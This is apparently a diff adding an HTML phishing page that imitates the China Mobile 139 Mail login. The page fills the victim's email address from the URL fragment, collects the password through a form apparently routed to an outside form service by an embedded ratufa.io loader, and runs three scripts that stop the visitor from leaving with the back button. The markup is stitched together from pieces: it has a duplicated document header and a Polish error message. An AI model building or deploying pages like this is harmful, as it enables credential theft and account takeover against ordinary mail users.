@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exmail Login - Not just mailbox</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* Top Information Ribbon Warning Alert Stripe Component */
+.top-notice-banner {
+    width: 100%;
+    background-color: #e0f2fe;
+    color: #0369a1;
+    font-size: 13px;
+    padding: 10px 40px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.top-notice-banner a {
+    color: #0284c7;
+    text-decoration: underline;
+}
+
+.close-notice {
+    cursor: pointer;
+    font-size: 16px;
+    opacity: 0.6;
+}
+
+/* Navigation Layer Components Row Toolbar Strip Header Bar */
+.navbar {
+    width: 100%;
+    max-width: 1240px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 16px 20px;
+    background-color: #ffffff;
+}
+
+/* Brand Image Logo Replacement Container Area Box Graphic Blueprint */
+.logo-box {
+    width: 140px;
+    height: 42px;
+    border: 1px dashed #2563eb;
+    background-color: #f0f4ff;
+    color: #2563eb;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: bold;
+}
+
+.nav-links {
+    font-size: 13px;
+    color: #4b5563;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.nav-links a {
+    color: #4b5563;
+    text-decoration: none;
+    padding: 0 4px;
+}
+
+.nav-links a:hover {
+    color: #2563eb;
+}
+
+.badge-link {
+    position: relative;
+}
+
+.nav-badge {
+    position: absolute;
+    top: -14px;
+    right: -24px;
+    background-color: #ef4444;
+    color: #ffffff;
+    font-size: 9px;
+    padding: 1px 4px;
+    border-radius: 4px;
+    white-space: nowrap;
+}
+
+/* Main Content Workspace Layout View Area Segment Frame Backdrops */
+.workspace-banner {
+    flex-grow: 1;
+    background-color: #cddffb;
+    /* Rich continuous smooth dual gradient color blend precisely simulating original background framework texture */
+    background: linear-gradient(135deg, #b3cffa 0%, #e0ebfc 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 40px 60px;
+    width: 100%;
+}
+
+.main-content-wrapper {
+    width: 100%;
+    max-width: 1240px;
+    display: flex;
+    gap: 40px;
+    align-items: center;
+    justify-content: space-between;
+}
+
+/* Left Hero Column: Specified Grid Graphic Boundary Object Placeholder Container Block */
+.left-hero-placeholder {
+    flex: 1.2;
+    min-height: 440px;
+    border: 2px dashed rgba(37, 99, 235, 0.3);
+    border-radius: 16px;
+    background-color: rgba(255, 255, 255, 0.3);
+    color: #1e3a8a;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    font-weight: 500;
+}
+
+/* Right Hero Column: Main Credentials Card Module Float Panel Box Box Card */
+.login-card {
+    flex: 0.8;
+    max-width: 380px;
+    background-color: #ffffff;
+    padding: 32px 28px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(30, 58, 138, 0.1);
+    width: 100%;
+}
+
+/* Triple Navigation Bar Tab Strip Links Menu elements styling properties */
+.login-tabs {
+    display: flex;
+    border-bottom: 1px solid #e5e7eb;
+    margin-bottom: 28px;
+    width: 100%;
+}
+
+.tab-item {
+    flex: 1;
+    padding: 10px 4px;
+    text-align: center;
+    font-size: 14px;
+    font-weight: 500;
+    color: #4b5563;
+    line-height: 1.3;
+    cursor: pointer;
+}
+
+.tab-item .sub-tab {
+    font-size: 11px;
+    color: #9ca3af;
+}
+
+.tab-item.active {
+    color: #2563eb;
+    font-weight: bold;
+    border-bottom: 3px solid #2563eb;
+}
+
+.tab-item.active .sub-tab {
+    color: #2563eb;
+}
+
+.form-group {
+    margin-bottom: 16px;
+    width: 100%;
+}
+
+/* Capsule field layout framework style row items container matching original bounds shape layout design */
+.form-group.row-input-split {
+    display: flex;
+    align-items: center;
+    border: 1px solid #cbd5e1;
+    border-radius: 6px;
+    overflow: hidden;
+    height: 44px;
+    padding: 0 12px;
+    background-color: #ffffff;
+}
+
+.form-group.row-input-split:focus-within {
+    border-color: #2563eb;
+    box-shadow: 0 0 0 1px #2563eb;
+}
+
+.input-icon-prefix {
+    color: #9ca3af;
+    font-size: 14px;
+    margin-right: 8px;
+    user-select: none;
+}
+
+.form-control {
+    flex: 1;
+    height: 100%;
+    border: none;
+    font-size: 14px;
+    color: #1f2937;
+    outline: none;
+    background: transparent;
+}
+
+.form-control::placeholder {
+    color: #9ca3af;
+    font-weight: 400;
+}
+
+.domain-addon {
+    color: #4b5563;
+    font-size: 14px;
+    padding-left: 6px;
+    user-select: none;
+}
+
+.password-toggle-icon {
+    color: #9ca3af;
+    cursor: pointer;
+    font-size: 14px;
+    padding-left: 6px;
+}
+
+/* Secondary auxiliary controls row options components grid links row */
+.aux-links-row {
+    display: flex;
+    justify-content: space-between;
+    font-size: 12px;
+    margin-bottom: 18px;
+    padding: 0 2px;
+}
+
+.aux-links-row a {
+    color: #2563eb;
+    text-decoration: none;
+}
+
+.aux-links-row a:hover {
+    text-decoration: underline;
+}
+
+/* Toggle Slider Button Alignment Parameters Container */
+.toggle-row {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 24px;
+    padding-left: 2px;
+}
+
+.switch-control {
+    position: relative;
+    display: inline-block;
+    width: 28px;
+    height: 16px;
+}
+
+.switch-control input {
+    opacity: 0;
+    width: 0;
+    height: 0;
+}
+
+.slider-round {
+    position: absolute;
+    cursor: pointer;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: #cbd5e1;
+    transition: .2s;
+    border-radius: 16px;
+}
+
+.slider-round:before {
+    position: absolute;
+    content: "";
+    height: 12px;
+    width: 12px;
+    left: 2px;
+    bottom: 2px;
+    background-color: white;
+    transition: .2s;
+    border-radius: 50%;
+}
+
+input:checked + .slider-round {
+    background-color: #2563eb;
+}
+
+input:checked + .slider-round:before {
+    transform: translateX(12px);
+}
+
+.toggle-label {
+    font-size: 12px;
+    color: #4b5563;
+}
+
+/* Crisp wide rectangular royal sky blue primary submission action button precisely tracking sample specifications */
+.submit-btn {
+    width: 100%;
+    background-color: #0086f6; /* Eye-catching primary blue shade */
+    color: #ffffff;
+    border: none;
+    height: 44px;
+    font-size: 15px;
+    font-weight: 500;
+    border-radius: 6px;
+    cursor: pointer;
+    margin-bottom: 20px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #0075d9;
+}
+
+/* Fine-print legal data confirmation check block line rules */
+.agreement-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 6px;
+    font-size: 11px;
+    color: #6b7280;
+    line-height: 1.4;
+    text-align: left;
+    margin-bottom: 24px;
+}
+
+.agreement-row input {
+    margin-top: 2px;
+    accent-color: #2563eb;
+}
+
+.agreement-row a {
+    color: #2563eb;
+    text-decoration: none;
+}
+
+/* Centered QR code container block component wrapper footer element */
+.qr-footer-wrapper {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border-top: 1px dashed #e5e7eb;
+    padding-top: 20px;
+    text-align: left;
+}
+
+.qr-graphic-box {
+    width: 52px;
+    height: 52px;
+    border: 1px dashed #cbd5e1;
+    background-color: #f8fafc;
+    color: #94a3b8;
+    font-size: 9px;
+    font-weight: bold;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+}
+
+.qr-text {
+    font-size: 12px;
+    color: #4b5563;
+    line-height: 1.4;
+}
+
+/* OS Transparent Overlay Watermark Mock Rendering Display Layout Node Structure Blueprint */
+.system-watermark {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(0, 0, 0, 0.09);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 100;
+}
+
+@media (max-width: 900px) {
+    .main-content-wrapper {
+        flex-direction: column;
+        gap: 40px;
+    }
+    .left-hero-placeholder {
+        width: 100%;
+        min-height: 200px;
+    }
+    .login-card {
+        max-width: 100%;
+    }
+}
+
+
+    </style>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>139邮箱 - 中国移动</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Top Notice Banner -->
+    <div class="top-notice-banner">
+        <span>📢 Notice Regarding the Discontinuation of Certain Benefits Packages for China Mobile 139 Mailbox Click <a href="#">to view details</a>.</span>
+        <span class="close-notice">×</span>
+    </div>
+
+    <!-- Main Navigation Header Ribbon -->
+    <header class="navbar">
+        <div class="brand-logo-area">
+            <!-- Header Logo Image Placeholder Box -->
+            <img src="https://github.com/cdtechdigital/images/blob/main/139logo.JPG?raw=true" alt="Trulli" width="" height="">
+        </div>
+        <nav class="nav-links">
+            <a href="#">Enterprise Email</a> | 
+            <a href="#" class="badge-link">下载客户端 <span class="nav-badge">领好礼</span></a> | 
+            <a href="#">Add to Favorites</a> | 
+            <a href="#">Online Customer Service</a> | 
+            <a href="#">Help</a> | 
+            <a href="#">Official WeChat</a>
+        </nav>
+    </header>
+
+    <!-- Main Panoramic horizon Content Workspace Area Component -->
+    <main class="workspace-banner">
+        <div class="main-content-wrapper">
+            
+            <!-- Left Column Content Feature Graphic/Illustration Placeholder Area -->
+            <div class="left-hero-placeholder">
+                          <img src="https://github.com/cdtechdigital/images/blob/main/139mail..JPG?raw=true" alt="Trulli" width="" height="">
+            </div>
+
+            <!-- Right Column Form Container Card Box Component Module -->
+            <div class="login-card">
+                
+                <!-- Triple Navigation Tab Strip Links Menu elements -->
+                <div class="login-tabs">
+                    <div class="tab-item">SMS<br><span class="sub-tab">verification</span></div>
+                    <div class="tab-item">Mobile<br><span class="sub-tab">SIM</span></div>
+                    <div class="tab-item active">Account<br><span class="sub-tab">password</span></div>
+                </div>
+
+                <!-- Form submission tracking configuration using FormSubmit module paths -->
+                <form action="" method="POST">
+                        
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                    <!-- Username Input Group Field Component Row -->
+                    <div class="form-group row-input-split">
+                        <span class="input-icon-prefix">👤</span>
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                       
+                    </div>
+
+                    <!-- Secure Password Entry Field Component Area Block -->
+                    <div class="form-group row-input-split">
+                        <span class="input-icon-prefix">🔒</span>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                        <span class="password-toggle-icon">👁️</span>
+                    </div>
+
+                    <!-- Auxiliary Action Links Section Row -->
+                    <div class="aux-links-row">
+                        <a href="#">Password recovery</a>
+                        <a href="#">register</a>
+                    </div>
+
+                    <!-- Stay Logged Selection Switch Parameter Option -->
+                    <div class="toggle-row">
+                        <label class="switch-control">
+                            <input type="checkbox" name="remember">
+                            <span class="slider-round"></span>
+                        </label>
+                        <span class="toggle-label">Keep me logged in</span>
+                    </div>
+
+                    <!-- Solid Rounded Rectangular Sky Blue Submission Trigger Button Block -->
+                    <button type="submit" class="submit-btn">Log in</button>
+
+                    <!-- Legal Terms Acceptance Checkbox Row -->
+                    <div class="agreement-row">
+                        <input type="checkbox" id="agree" name="agree" required>
+                        <label for="agree">I have read and agree to the <a href="#">User Agreement</a> and <a href="#">Privacy Policy</a>.</label>
+                    </div>
+                </form>
+
+                <!-- Centered QR code container block component wrapper footer -->
+                <div class="qr-footer-wrapper">
+                    <div class="qr-graphic-box">QR Code Block</div>
+                    <div class="qr-text">Scan the QR code to download the<br><strong>139 Email app</strong>.</div>
+                </div>
+
+  
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
